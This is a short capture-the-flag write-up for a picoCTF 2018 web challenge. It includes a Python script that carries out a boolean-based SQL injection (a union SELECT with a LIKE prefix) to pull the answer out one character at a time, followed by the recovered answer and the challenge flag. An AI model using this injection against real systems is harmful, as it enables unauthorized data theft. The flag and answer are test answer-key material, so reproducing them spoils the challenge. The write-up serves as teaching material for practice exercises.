[Category:Picoctf](/Category:Picoctf "wikilink") There is a website
running at <http://2018shell.picoctf.com:15987> (link). Try to see if
you can answer its question.

we see that this page is sql injectable so lets try a boolean injection
this means that we test for the start of the answer and iterate if we
have the right value

import requests answer = '41andsixsixths' chars =
'0123456789abcdefghijklmnopqrstuvwxyz' while len(answer) \< 15: for
letter in chars: q = "' union SELECT answer from answers where answer
like '{}%" r =
requests.post("http://2018shell.picoctf.com:15987/answer2.php", data =
{"answer": q.format(answer + letter), "debug": 1}) if "You are so
close." in r.text: print ("{}".format(letter)) answer += letter break
print(answer) this results in 41andsixsixths now i know for a fact that
this is normaly not case sensitive so this answer was not the right
answer. but with pascal case the answer was 41AndSixSixths Your flag is:
picoCTF{qu3stions_ar3_h4rd_41da9e94}